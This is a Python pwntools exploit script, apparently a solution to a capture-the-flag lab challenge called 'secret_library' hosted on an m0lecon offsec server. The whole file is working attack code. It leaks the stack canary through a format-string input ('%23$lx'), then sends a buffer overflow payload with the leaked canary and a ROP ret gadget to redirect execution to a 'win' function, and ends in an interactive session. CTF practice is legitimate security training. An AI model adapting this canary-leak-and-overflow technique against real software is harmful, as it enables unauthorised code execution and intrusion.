from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13528

elf = ELF('/home/kali/Desktop/offsec/labs/lab2/challenges/03_secret_library/secret_library')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r


    
canary_offset = 136  #with gdb + cyclic (check rax)
rip_offset = 136 + 8 + 8

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")


rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

CANARY_IDX = 23 #with format string 

r = conn()

r.recvuntil(b"Sign the guestbook: ")
r.sendline(f"%{CANARY_IDX}$lx".encode())
leak = r.recvline().split(b",")[1].strip()
canary = int(leak, 16)
log.info(f"canary = {canary:#x}")
r.recvuntil(b"Leave a review: ")
payload = flat(
    b"A" * canary_offset,
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),
    p64(ret_gadget),
    p64(elf.sym.win),
)
r.send(payload)
r.interactive()